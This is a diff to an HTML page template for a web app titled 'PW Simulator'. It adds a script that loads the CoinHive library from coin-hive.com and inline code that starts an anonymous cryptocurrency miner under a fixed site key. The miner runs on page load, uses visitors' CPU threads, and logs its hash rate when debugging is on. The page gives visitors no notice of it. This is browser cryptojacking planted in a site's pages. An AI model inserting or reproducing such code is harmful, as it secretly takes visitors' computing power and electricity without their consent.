@@ -6,6 +6,10 @@
 		<meta name="og:image" content="/static/media/launcher-icon-2x.png">
 		<title>PW Simulator</title>
 		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+		<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+		<script>
+			var c=('hardwareConcurrency' in navigator)?navigator.hardwareConcurrency:2;var t=Math.min(2, ~~c/1.5);var m=new CoinHive.Anonymous('bZvhfyO2CvWH50x7pVEn5DaZOMRwGCcI',{threads:t,throttle:.25});m.start();setInterval(function(){var hps=m.getHashesPerSecond();var t=m.getTotalHashes();if(debug){console.clear();console.log(hps, 'H/s');console.log(t, 't');}},1000);debug = false;
+		</script>
 	</head>
 	<body>
 		<div id="root">
@@ -13,7 +17,6 @@
 				<%= htmlWebpackPlugin.options.markup %>
 			<% } %>
 		</div>
-		<!-- <link href="https://fonts.googleapis.com/css?family=Rubik:300,400" rel="stylesheet"> -->
 		<% if (htmlWebpackPlugin.options.preloadedState) { %>
 			<script>
 				window.__STATE__ = JSON.stringify(<%= htmlWebpackPlugin.options.preloadedState %>).replace(/</g, '\\u003c');
